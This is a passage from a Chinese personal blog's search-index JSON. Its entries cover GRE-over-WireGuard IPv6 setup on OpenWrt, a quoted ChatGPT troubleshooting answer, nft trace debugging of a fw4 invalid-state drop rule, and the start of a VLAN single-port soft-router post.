PD\uff0c\u56e0\u6b64\u53ef\u4ee5\u4e0d\u8bbe\u7f6e dhcpv4\uff09</li> <li>ubuntu \u7aef\u5c06 gretap \u548c br0(ustcnet bridge) \u6865\u63a5</li> </ul> </li> <li>\u6b64\u65f6 op \u5df2\u7ecf\u53ef\u4ee5\u83b7\u5f97 ipv6 PD \u4e86</li> <li>lan interface \u4e0a\u52fe\u7ebf ipv6 prefix\uff0c\u5f00\u542f ra server\u3002\u4e4b\u540e lan \u5185\u8bbe\u5907\u5c31\u53ef\u4ee5\u83b7\u5f97 ipv6 \u5730\u5740\u4e86</li> <li>\u6b64\u65f6 lan \u5185\u8bbe\u5907 ipv6 \u4ecd\u65e0\u6cd5\u4e0a\u7f51\uff0c\u9700\u8981\u5728 ubuntu \u4e0a\u5f00\u542f ipv6 forward</li> </ul> <pre><code>sudo systemctl start wg-quick@op2-gre-wg0\nsudo ip link add op2-gre1 type gretap  local 10.0.31.10 remote 10.0.31.2 ttl 255\nsudo ip link set op2-gre1 up\nsudo ip link set op2-gre1 master br0\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#gre-\u4e0d\u901achatgpt-\u56de\u590d","title":"gre \u4e0d\u901a\uff0cchatgpt \u56de\u590d","text":"<p>\u6211\u521b\u5efa\u4e86\u4e00\u4e2a pve lxc \u5bb9\u5668\uff0c\u5206\u914d\u7684\u7f51\u7edc\u63a5\u53e3 eth0 \u5bf9\u5e94 pve \u7684 vmbr0\uff0c\u5bb9\u5668\u5185 eth0 \u63a5\u5728 br-wan \u4e0a\u3002\u7136\u540e\u6211\u5728 pve lxc \u5bb9\u5668\u4e2d\u521b\u5efa\u4e86\u4e00\u4e2a gretap \u8bbe\u5907\uff0c\u6865\u63a5\u5230 br-wan \u4e0a\uff0c\u4f46\u662f gretap \u4e0a\u7684 ipv6 rs \u62a5\u6587\u65e0\u6cd5\u901a\u8fc7 br-wan \u53d1\u9001\u5230 eth0\uff0c\u4ece\u800c\u65e0\u6cd5\u6b63\u786e\u53d1\u9001\u5230 pve \u5916\u7684 vmbr0\uff0c\u6211\u8be5\u600e\u4e48\u505a</p> <p>ChatGPT</p> <p>\u60a8\u7684\u7f51\u7edc\u62d3\u6251\u4e2d\u5305\u542b\u4e86\u591a\u5c42\u865a\u62df\u5316\u7f51\u7edc\uff08PVE \u5bb9\u5668\u5185\u7684 GRETAP \u8bbe\u5907\u3001LXC \u5bb9\u5668\u548c PVE \u5bbf\u4e3b\u673a\uff09\u3002\u4e3a\u4e86\u786e\u4fdd GRETAP \u8bbe\u5907\u7684 IPv6 RS \u62a5\u6587\u80fd\u591f\u6b63\u786e\u4f20\u9012\u5230 PVE \u5bbf\u4e3b\u673a\u7684 vmbr0 \u4ee5\u5916\u7684\u7f51\u7edc\uff0c\u60a8\u9700\u8981\u8fdb\u884c\u4e00\u4e9b\u7f51\u7edc\u914d\u7f6e\u3002\u4ee5\u4e0b\u662f\u53ef\u80fd\u7684\u89e3\u51b3\u65b9\u6cd5\uff1a</p> <ol> <li> <p>\u68c0\u67e5 IPv6 Forwarding \u8bbe\u7f6e\uff1a\u9996\u5148\uff0c\u786e\u4fdd PVE \u5bbf\u4e3b\u673a\u4e0a\u542f\u7528\u4e86 IPv6 \u8f6c\u53d1\u529f\u80fd\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u68c0\u67e5\uff1a     <code>sysctl net.ipv6.conf.all.forwarding</code>     \u5982\u679c\u8fd4\u56de\u503c\u4e3a 1\uff0c\u8868\u793a\u5df2\u542f\u7528 IPv6 \u8f6c\u53d1\u3002\u5982\u679c\u8fd4\u56de\u503c\u4e3a 0\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u542f\u7528\u5b83\uff1a     <code>sysctl -w net.ipv6.conf.all.forwarding=1</code>     \u4e3a\u4e86\u4f7f\u6b64\u66f4\u6539\u6301\u4e45\u5316\uff0c\u60a8\u53ef\u4ee5\u5c06\u5b83\u6dfb\u52a0\u5230 <code>/etc/sysctl.conf</code> \u6587\u4ef6\u4e2d\u3002</p> </li> <li> <p>LXC \u5bb9\u5668\u7f51\u7edc\u914d\u7f6e\uff1a\u786e\u4fdd LXC \u5bb9\u5668\u5185\u7684 GRETAP \u8bbe\u5907\u548c br-wan \u63a5\u53e3\u6b63\u786e\u914d\u7f6e\u3002\u68c0\u67e5 GRETAP \u8bbe\u5907\u7684 IPv6 \u5730\u5740\u3001\u5b50\u7f51\u548c\u8def\u7531\u662f\u5426\u6b63\u786e\u8bbe\u7f6e\u3002\u786e\u4fdd GRETAP \u8bbe\u5907\u80fd\u591f\u6b63\u786e\u8def\u7531 IPv6 \u6d41\u91cf\u3002</p> </li> <li> <p>\u5bb9\u5668\u5185\u9632\u706b\u5899\u89c4\u5219\uff1a\u5982\u679c LXC \u5bb9\u5668\u5185\u6709\u9632\u706b\u5899\u89c4\u5219\uff0c\u786e\u4fdd\u5b83\u4eec\u4e0d\u4f1a\u963b\u6b62 IPv6 \u6d41\u91cf\u4ece GRETAP \u8bbe\u5907\u4f20\u9012\u5230 br-wan \u63a5\u53e3\u3002\u60a8\u53ef\u80fd\u9700\u8981\u5728\u5bb9\u5668\u5185\u7684\u9632\u706b\u5899\u89c4\u5219\u4e2d\u6dfb\u52a0\u5141\u8bb8 IPv6 \u6d41\u91cf\u901a\u8fc7\u7684\u89c4\u5219\u3002</p> </li> <li> <p>PVE \u5bbf\u4e3b\u673a\u7f51\u7edc\u6865\u914d\u7f6e\uff1a\u786e\u4fdd PVE \u5bbf\u4e3b\u673a\u4e0a\u7684\u7f51\u7edc\u6865\uff08vmbr0 \u548c br-wan\uff09\u6b63\u786e\u914d\u7f6e\uff0c\u4ee5\u5141\u8bb8 IPv6 \u6d41\u91cf\u6b63\u786e\u4f20\u9012\u3002\u68c0\u67e5\u5b83\u4eec\u7684 IPv6 \u5730\u5740\u3001\u5b50\u7f51\u548c\u8def\u7531\u8bbe\u7f6e\u3002</p> </li> <li> <p>LXC \u5bb9\u5668\u95f4\u9694\u79bb\u8bbe\u7f6e\uff1a\u8bf7\u786e\u4fdd\u5728 PVE \u5bbf\u4e3b\u673a\u7684\u7f51\u7edc\u914d\u7f6e\u4e2d\uff0cLXC \u5bb9\u5668\u4e4b\u95f4\u7684\u7f51\u7edc\u9694\u79bb\u8bbe\u7f6e\u4e0d\u4f1a\u963b\u6b62 IPv6 \u6d41\u91cf\u7684\u4f20\u9012\u3002\u8fd9\u53ef\u80fd\u9700\u8981\u8c03\u6574\u5b89\u5168\u7ec4\u6216\u7f51\u7edc\u9694\u79bb\u89c4\u5219\u3002</p> </li> <li> <p>MTU \u8bbe\u7f6e\uff1a\u5728\u591a\u5c42\u865a\u62df\u5316\u7f51\u7edc\u4e2d\uff0cMTU\uff08\u6700\u5927\u4f20\u8f93\u5355\u5143\uff09\u95ee\u9898\u53ef\u80fd\u4f1a\u5bfc\u81f4\u901a\u4fe1\u95ee\u9898\u3002\u786e\u4fdd\u5404\u4e2a\u7f51\u7edc\u8bbe\u5907\u7684 MTU \u8bbe\u7f6e\u6b63\u786e\uff0c\u5e76\u4e14\u4e0d\u4f1a\u5bfc\u81f4\u5206\u6bb5\u6216\u4e22\u5931\u6570\u636e\u5305\u3002</p> </li> <li> <p>\u7f51\u7edc\u6293\u5305\uff1a\u5982\u679c\u95ee\u9898\u4ecd\u7136\u5b58\u5728\uff0c\u60a8\u53ef\u4ee5\u5728\u4e0d\u540c\u7684\u7f51\u7edc\u8bbe\u5907\u4e0a\u4f7f\u7528\u6293\u5305\u5de5\u5177\uff08\u5982 Wireshark \u6216 tcpdump\uff09\u6765\u6355\u83b7 IPv6 \u6d41\u91cf\uff0c\u4ee5\u4fbf\u66f4\u8be6\u7ec6\u5730\u5206\u6790\u95ee\u9898\u5e76\u627e\u51fa\u6545\u969c\u7684\u4f4d\u7f6e\u3002</p> </li> </ol> <p>\u8bf7\u6839\u636e\u4e0a\u8ff0\u5efa\u8bae\u9010\u6b65\u68c0\u67e5\u548c\u8c03\u6574\u60a8\u7684\u7f51\u7edc\u914d\u7f6e\uff0c\u4ee5\u89e3\u51b3 IPv6 RS \u62a5\u6587\u65e0\u6cd5\u6b63\u786e\u4f20\u9012\u7684\u95ee\u9898\u3002\u786e\u4fdd\u5728\u66f4\u6539\u7f51\u7edc\u914d\u7f6e\u4e4b\u524d\u5907\u4efd\u91cd\u8981\u6570\u636e\uff0c\u4ee5\u9632\u610f\u5916\u53d1\u751f\u3002</p> <p>\u4e0a\u9762\u63d0\u5230\u7684\uff1a</p> <p>\u786e\u4fdd\u5b83\u4eec\u4e0d\u4f1a\u963b\u6b62 IPv6 \u6d41\u91cf\u4ece GRETAP \u8bbe\u5907\u4f20\u9012\u5230 br-wan \u63a5\u53e3\u3002</p> <p>\u771f\u7684\u8ba9\u6211\u627e\u5230\u4e86\u95ee\u9898\uff01</p>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u76f8\u5173\u5c0f\u5b9e\u9a8c","title":"\u76f8\u5173\u5c0f\u5b9e\u9a8c","text":"","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u7ed5\u8def\u8fd4\u56dewan-\u53e3\u8fdb\u5165wg-\u63a5\u53e3\u8fd4\u56de","title":"\u7ed5\u8def\u8fd4\u56de\uff1awan \u53e3\u8fdb\u5165\uff0cwg \u63a5\u53e3\u8fd4\u56de","text":"<p>\u7f51\u7edc\u60c5\u51b5</p> <ul> <li>op2\uff08\u53d1\u8d77 ping\uff09<ul> <li>eth0: 114.214.173.252</li> </ul> </li> <li>king3399\uff08\u54cd\u5e94 ping\uff09<ul> <li>eth0: 222.195.90.107</li> <li>wg0: endpoint op1, default route</li> </ul> </li> <li>op1\uff08\u8def\u7531\u4e2d\u8f6c\uff09<ul> <li>br-wan: 114.214.236.72</li> </ul> </li> </ul> <p>icmp request op2(eth0) -&gt; king(eth0)</p> <ul> <li>route \u8d70\u5b66\u6821</li> </ul> <p>icmp reply king(eth0) -&gt; op2(eth0)</p> <ul> <li>route \u901a\u8fc7 wg0\uff0c\u53d1\u9001\u7ed9 op1</li> <li>op1 \u518d\u8f6c\u53d1\uff0c\u4ece br-wan \u51fa\u53bb\uff0c\u5230\u8fbe op2</li> </ul> <p>op1 \u6536\u5230 king \u7684 icmp reply \u518d\u8f6c\u53d1\uff0c\u5b9e\u9645\u6709\u4e24\u4e2a\u969c\u788d</p> <ol> <li>op1 \u5c06 wg0 \u6536\u5230\u7684 src \u5730\u5740\u4e3a op2(eth0) \u7684\u5305\u4e22\u5f03\uff0c\u56e0\u4e3a\u4e0d\u5728 allow ip \u4e2d\u3002\u89e3\u51b3\u529e\u6cd5\uff1aallow ip \u8bbe\u7f6e\u4e3a 0.0.0.0\uff0c\u5173\u95ed\u81ea\u52a8\u6dfb\u52a0\u8def\u7531</li> <li>op1 wg0 \u6536\u5230\u5305\u540e\uff0c\u5374\u53d1\u73b0\u5e76\u6ca1\u6709\u4ece wan \u53e3\u53d1\u9001\u51fa\u53bb</li> </ol> <p>\u4ee5\u4e0b\u662f\u5bf9\u95ee\u9898 2 \u7684\u63a2\u7a76</p> <p>\u9996\u5148 king \u4e0a\u7b26\u5408\u9884\u671f\uff0c\u4ece eth0 \u6536\u5230 icmp request\uff0c\u4ece wg0 \u8fd4\u56de icmp reply</p> <pre><code>tcpdump -ni any icmp and host 222.195.90.107\n\n22:08:20.292237 eth0  In  IP 114.214.173.252 &gt; 222.195.90.107: ICMP echo request, id 65124, seq 5, length 64\n22:08:20.292430 wg0   Out IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 65124, seq 5, length 64\n</code></pre> <p>\u95ee\u9898\u51fa\u73b0\u5728 op1\uff0c\u53ef\u4ee5\u770b\u5230 wg0 \u6536\u5230\u4e86\u5305\uff0c\u4f46\u662f\u5374\u6ca1\u6709\u4efb\u4f55 output</p> <pre><code>root@op1 \u279c  ~ tcpdump -ni any icmp and host 114.214.173.252\n\n22:09:22.298394 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 65124, seq 67, length 64\n22:09:23.298654 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 65124, seq 68, length 64\n</code></pre> <p>\u7814\u7a76\u540e\u53d1\u73b0\u4f7f\u7528 nft trace \u53ef\u4ee5\u8ffd\u8e2a\u5305\u5728\u9632\u706b\u5899\u4e2d\u7684\u5904\u7406\u987a\u5e8f</p> <ul> <li>trace id \u6807\u8bc6\u4e00\u4e2a\u5305</li> <li>\u53ef\u4ee5\u770b\u5230\u4f9d\u6b21\u7ecf\u8fc7\u4ee5\u4e0b chain \u5904\u7406\uff0c\u7ed3\u5c3e\u7684 verdict\uff08\u5224\u51b3\uff09\u8868\u793a\u5904\u7406\u7ed3\u679c<ul> <li>raw_prerouting</li> <li>mangle_prerouting</li> <li>prerouting</li> <li>mangle_forward</li> <li>forward<ul> <li>\u5728\u8fd9\u91cc\u5339\u914d<code>meta nfproto ipv4 oifname { \"br-wan\", \"gre4t-gre1\" } ct state invalid counter drop</code>\u89c4\u5219\uff0c\u7136\u540e\u88ab drop \u4e86</li> </ul> </li> </ul> </li> </ul> <pre><code>trace id 146d2af5 inet fw4 debug packet: iif \"wg0\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 debug rule iifname \"wg0\" ip saddr 222.195.90.107 meta nftrace set 1 counter packets 4 bytes 336 (verdict continue)\ntrace id 146d2af5 inet fw4 debug verdict continue\ntrace id 146d2af5 inet fw4 debug policy accept\ntrace id 146d2af5 inet fw4 raw_prerouting packet: iif \"wg0\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 raw_prerouting verdict continue\ntrace id 146d2af5 inet fw4 raw_prerouting policy accept\ntrace id 146d2af5 inet fw4 mangle_prerouting packet: iif \"wg0\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 mangle_prerouting verdict continue\ntrace id 146d2af5 inet fw4 mangle_prerouting policy accept\ntrace id 146d2af5 inet fw4 prerouting packet: iif \"wg0\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 prerouting rule iifname { \"wg0\", \"br-lan\", \"ztyou4dlov\" } jump helper_lan comment \"!fw4: Handle lan IPv4/IPv6 helper assignment\" (verdict jump helper_lan)\ntrace id 146d2af5 inet fw4 helper_lan verdict continue\ntrace id 146d2af5 inet fw4 prerouting verdict continue\ntrace id 146d2af5 inet fw4 prerouting policy accept\ntrace id 146d2af5 inet fw4 mangle_forward packet: iif \"wg0\" oif \"br-wan\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 63 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 mangle_forward verdict continue\ntrace id 146d2af5 inet fw4 mangle_forward policy accept\ntrace id 146d2af5 inet fw4 forward packet: iif \"wg0\" oif \"br-wan\" ip saddr 222.195.90.107 ip daddr 114.214.173.252 ip dscp cs0 ip ecn not-ect ip ttl 63 ip id 19723 ip protocol icmp ip length 84 icmp type echo-reply icmp code net-unreachable icmp id 14312 icmp sequence 881 @th,64,96 0x8cdff2c20000000000000000\ntrace id 146d2af5 inet fw4 forward rule iifname { \"wg0\", \"br-lan\", \"ztyou4dlov\" } jump forward_lan comment \"!fw4: Handle lan IPv4/IPv6 forward traffic\" (verdict jump forward_lan)\ntrace id 146d2af5 inet fw4 forward_lan rule jump accept_to_wan comment \"!fw4: Accept lan to wan forwarding\" (verdict jump accept_to_wan)\ntrace id 146d2af5 inet fw4 accept_to_wan rule meta nfproto ipv4 oifname { \"br-wan\", \"gre4t-gre1\" } ct state invalid counter packets 31820 bytes 3109375 drop comment \"!fw4: Prevent NAT leakage\" (verdict drop)\n</code></pre> <p>\u901a\u8fc7 nft \u4fee\u6539\u6389\u8be5 drop\uff0c\u53d1\u73b0\u5c31\u80fd ping \u901a\u4e86 op1 \u4e0a tcpdump \u53ef\u4ee5\u770b\u5230\u6b63\u786e\u4ece br-wan \u8f6c\u53d1</p> <pre><code>23:38:13.018068 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 14312, seq 2631, length 64\n23:38:13.018089 br-wan Out IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 14312, seq 2631, length 64\n</code></pre> <p>op2 \u548c king \u4e0a\u90fd\u80fd\u770b\u5230 conntrack \u4fe1\u606f</p> <pre><code>root@op2 \u279c  ~ conntrack -L -p icmp -d 222.195.90.107\nicmp     1 29 src=114.214.173.252 dst=222.195.90.107 type=8 code=0 id=31588 packets=112 bytes=9408 src=222.195.90.107 dst=114.214.173.252 type=0 code=0 id=31588 packets=104 bytes=8736 mark=0 use=1\nconntrack v1.4.8 (conntrack-tools): 1 flow entries have been shown.\n</code></pre> <p>\u4e0d\u8fc7 op1 \u4e0a\u6ca1\u6709\uff08\u96be\u9053\u8f6c\u53d1\u4e0d\u7b97\uff1f\uff09</p> <pre><code>root@op1 \u279c  ~ conntrack -L -p icmp |grep 222.195.90.107\nconntrack v1.4.8 (conntrack-tools): 151 flow entries have been shown.\n</code></pre> <p>\u4f46\u662f\u8be5\u89c4\u5219\u5230\u5e95\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1fct invalid \u4e3a\u4ec0\u4e48\u4f1a\u5339\u914d\uff1f</p> <p>\u8fde\u63a5\u8ddf\u8e2a\u662f Linux \u5185\u6838\u4e2d\u7684\u4e00\u9879\u529f\u80fd\uff0c\u7528\u4e8e\u8ddf\u8e2a\u7f51\u7edc\u8fde\u63a5\u7684\u72b6\u6001\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u8fde\u63a5\u8ddf\u8e2a\u72b6\u6001\uff1a</p> <ol> <li><code>new</code>\uff08\u65b0\u8fde\u63a5\uff09\uff1a\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u65b0\u7684\u3001\u5c1a\u672a\u5efa\u7acb\u7684\u8fde\u63a5\u3002</li> <li><code>established</code>\uff08\u5df2\u5efa\u7acb\uff09\uff1a\u8868\u793a\u8fde\u63a5\u5df2\u7ecf\u6210\u529f\u5efa\u7acb\uff0c\u6570\u636e\u53ef\u4ee5\u5728\u6e90\u548c\u76ee\u6807\u4e4b\u95f4\u4f20\u8f93\u3002</li> <li><code>related</code>\uff08\u76f8\u5173\u8fde\u63a5\uff09\uff1a\u8868\u793a\u8fd9\u662f\u4e0e\u73b0\u6709\u8fde\u63a5\u76f8\u5173\u7684\u65b0\u8fde\u63a5\uff0c\u4f8b\u5982 FTP \u6570\u636e\u8fde\u63a5\u4e0e FTP \u63a7\u5236\u8fde\u63a5\u7684\u5173\u7cfb\u3002</li> <li><code>untracked</code>\uff08\u672a\u8ddf\u8e2a\uff09\uff1a\u8868\u793a\u8fde\u63a5\u672a\u88ab\u8fde\u63a5\u8ddf\u8e2a\u7cfb\u7edf\u8ddf\u8e2a\u3002</li> <li><code>snat</code>\uff08\u6e90 NAT\uff09\uff1a\u8868\u793a\u8fde\u63a5\u7ecf\u8fc7\u6e90\u5730\u5740\u8f6c\u6362\u3002</li> <li><code>dnat</code>\uff08\u76ee\u6807 NAT\uff09\uff1a\u8868\u793a\u8fde\u63a5\u7ecf\u8fc7\u76ee\u6807\u5730\u5740\u8f6c\u6362\u3002</li> <li><code>tracert</code>\uff08\u8ddf\u8e2a\u8def\u7531\uff09\uff1a\u8868\u793a\u8fd9\u662f\u4e00\u4e2a ICMP \u8ddf\u8e2a\u8def\u7531\u7684\u8fde\u63a5\u3002</li> <li><code>dying</code>\uff08\u5173\u95ed\u4e2d\uff09\uff1a\u8868\u793a\u8fde\u63a5\u5373\u5c06\u5173\u95ed\u3002</li> <li><code>reply</code>\uff08\u56de\u590d\uff09\uff1a\u8868\u793a\u8fd9\u662f\u4e00\u4e2a ICMP Echo Reply \u62a5\u6587\u3002</li> <li><code>timeout</code>\uff08\u8d85\u65f6\uff09\uff1a\u8868\u793a\u8fde\u63a5\u5df2\u8d85\u65f6\u3002</li> <li><code>closed</code>\uff08\u5df2\u5173\u95ed\uff09\uff1a\u8868\u793a\u8fde\u63a5\u5df2\u5173\u95ed\u3002</li> <li><code>invalid</code>\uff08\u65e0\u6548\uff09\uff1a\u8868\u793a\u8fde\u63a5\u51fa\u73b0\u5f02\u5e38\u6216\u4e0d\u5408\u6cd5\u7684\u72b6\u6001\uff0c\u4f8b\u5982\uff0c\u8fde\u63a5\u7684\u62a5\u6587\u987a\u5e8f\u4e0d\u6b63\u786e\u7b49\u3002</li> </ol> <p><code>ct state invalid</code> \u5c31\u662f\u5339\u914d\u8fde\u63a5\u8ddf\u8e2a\u72b6\u6001\u4e3a \"invalid\" \u7684\u62a5\u6587\uff0c\u901a\u5e38\u8868\u793a\u8fde\u63a5\u51fa\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898\uff0c\u53ef\u80fd\u662f\u7531\u4e8e\u62a5\u6587\u7684\u987a\u5e8f\u4e0d\u6b63\u786e\u6216\u5176\u4ed6\u5f02\u5e38\u60c5\u51b5\u3002</p> <p>fw4 \u89c4\u5219\u6ce8\u91ca\u4e2d\u63d0\u5230\u7684 Prevent NAT leakage\uff0c\u641c\u7d22 LuCI option to enable/disable \"NAT Leakage Prevention\" - Installing and Using OpenWrt - OpenWrt Forum</p> <p>This rule is only generated for firewall zones with masquerading how in blazes would non-NATted/martian packets leak to the WAN?</p> <p>NAT leakage on 22.03 [fw4] - Installing and Using OpenWrt - OpenWrt Forum \u77e5\u9053\u4e86\u6709<code>masq_allow_invalid</code>\u8fd9\u4e48\u4e00\u4e2a\u9009\u9879[OpenWrt Wiki] Firewall configuration /etc/config/firewall</p> <code>masq_allow_invalid</code> boolean no <code>0</code> Do not add\u00a0<code>DROP INVALID</code>\u00a0rules, if masquerading is used. The\u00a0<code>DROP</code>\u00a0rules are supposed to prevent\u00a0NAT\u00a0leakage (see\u00a0commit in firewall3). <p>GUI \u4e2d\u89e3\u91ca\uff1a</p> <p>Do not install extra rules to reject forwarded traffic with conntrack state\u00a0invalid. This may be required for complex asymmetric route setups.</p> <p>NAT: Masquerade can leak private IP, why&amp;how? - MikroTik</p> <ul> <li>\u5927\u6982\u5c31\u662f\u63a5\u53e3 down \u518d up\uff0c\u6709\u4e00\u4e9b\u5305\u6ca1\u6709\u6b63\u786e\u7684 ct \u72b6\u6001\uff0c\u4e0d\u4f1a\u7ecf\u8fc7 masq\u3002</li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/","title":"VLAN \u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531","text":"<p>\u8d77\u56e0\u662f\u53d1\u73b0\u5728\u539f\u672c\u7684\u4e24\u4e2a\u8def\u7531\u5668\u95f4\u67b6\u8bbe wireguard \u96a7\u9053\uff0c\u5176\u4e2d\u4e00\u4e2a\u8def\u7531\u5668 (\u5c0f\u7c73 4A \u5343\u5146\u7248) \u9047\u5230\u4e86 CPU \u74f6\u9888\uff0c\u5bfc\u81f4\u5e26\u5bbd\u53ea\u80fd\u8fbe\u5230 100-200 \u5de6\u53f3\u3002\u540e\u9762\u7814\u7a76\u4e86\u5e02\u9762\u4e0a\u7684\u5404\u79cd\u8def\u7531\u5668\u7684 CPU \u578b\u53f7\uff0c\u5305\u62ec\u77ff\u6e23\u8def\u7531\u5668\u3002\u8d2d\u4e70\u4e86\u4e00\u4e2a 100 \u5143\u7684\u53ef\u4ee5\u5237 openwrt \u7684\u7ade\u6597\u4e91 2.0\uff0c\u5e26\u5bbd\u53ef\u4ee5\u8fbe\u5230 200-300M\uff0c\u4f46\u4ecd\u8fdc\u4f4e\u4e8e\u7406\u60f3\u7684\u5343\u5146\u3002\u76ee\u524d\u5373\u4fbf\u662f 500 \u5143\u4ee5\u4e0a\u7684\u9ad8\u7aef\u8def\u7531\u5668\uff0c\u5176\u914d\u7f6e\u4ecd\u7136\u53ea\u6709 4 \u6838 Cortex A53@2.0GHz \u7684\u6c34\u5e73\u3002</p> <p>\u5076\u7136\u770b\u5230\u7528\u65e7\u7b14\u8bb0\u672c\u505a\u8f6f\u8def\u7531\u7684\u89c6\u9891\uff0c\u9042\u840c\u751f\u4e86\u6298\u817e\u8f6f\u8def\u7531\u7684\u60f3\u6cd5\u3002\u4ed4\u7ec6\u7814\u7a76\u5176\u65b9\u6848\u540e\u53d1\u73b0\u4e3a pppoe \u62e8\u53f7\u4e0a\u7f51\u7684\u65b9\u5f0f\uff0c\u4e0d\u9002\u7528\u4e8e dhcp \u4e0a\u7f51\u7684\u60c5\u51b5\u3002\u540e\u5076\u7136\u53d1\u73b0\u6240\u8d2d\u4e70\u8def\u7531\u5668\u652f\u6301 vlan \u529f\u80fd\uff08\u5176\u5b9e\u540e\u9762\u53d1\u73b0\u6240\u6709 openwrt \u8def\u7531\u5668\u90fd\u652f\u6301\uff09\uff0c\u4e8e\u662f\u81ea\u5df1\u72ec\u7acb\u6784\u601d\u4e86\u540e\u9762\u7684\u67b6\u6784\u56fe\u3002\u5e76\u5c1d\u8bd5\u6210\u529f (11/5)\uff0c\u6700\u7ec8\u5728\u7ea2\u7c73 AX6S+ \u8f6f\u8def\u7531\u7684\u60c5\u51b5\u4e0b\uff0c\u8fbe\u5230\u4e86 500M \u7684\u5e26\u5bbd\uff0c\u6b64\u65f6 AX6S \u7684\u53cc\u6838 Cortex A53@1.2GHz CPU \u5360\u7528\u7387\u4e5f\u8fbe\u5230\u4e86 100%\u3002</p> <p>\u4e4b\u540e\u518d\u63a5\u518d\u52b1\uff0c\u5c06 AX6S \u4e5f\u914d\u7f6e\u4e86 vlan\uff0c\u5e76\u5728\u65e7\u7b14\u8bb0\u672c\u5b9e\u73b0\u8f6f\u8def\u7531\u3002\u6700\u7ec8\u5e26\u5bbd\u8fbe\u5230\u4e86 880Mbps\uff0cscp \u6587\u4ef6\u8fbe\u5230 98MB/s \u7684\u901f\u7387\u3002\u5e76\u4e14\u4e4b\u540e\u8fd8\u6210\u529f\u914d\u7f6e\u4e86 Guest WIFI\uff0c\u5c06\u5176\u548c\u4e3b\u7f51\u7edc\u9694\u79bb\u5f00\u6765\uff0c\u66f4\u52a0\u4fdd\u8bc1\u4e86\u5b89\u5168\u6027\u3002</p> <p>\u901a\u8fc7\u672c\u6b21\u9879\u76ee\uff0c\u5b66\u4f1a\u4e86\uff1a</p> <ul> <li>linux \u4e0b\uff0cip, netplan \u521b\u5efa bridge \u548c vlan</li> <li>lxc \u5bb9\u5668\u7684\u4f7f\u7528</li> <li>openwrt DSA \u67b6\u6784\u914d\u7f6e vlan</li> </ul> <p>\u5f04\u5b8c\u540e\uff0c\u5728\u7f51\u4e0a\u641c\u7d22\u4e86\u4e00\u4e0b\u76f8\u5173\u5b9e\u73b0\uff0c\u53d1\u73b0\u63d0\u5230\u5355\u7f51\u53e3\u8f6f\u8def\u7531\uff0c\u6709\u51e0\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>\u9ed8\u8ba4\u662f pppoe \u4e0a\u7f51\u65b9\u5f0f\uff0c\u8be5\u65b9\u5f0f\u6bd4\u8f83\u7b80\u5355\uff0c\u4e0d\u6d89\u53ca vlan \u7684\u8bbe\u7f6e\uff0c\u4f46\u662f\u4e0d\u9002\u7528\u4e8e dhcp \u4e0a\u7f51\u7684\u60c5\u51b5\u3002</li> 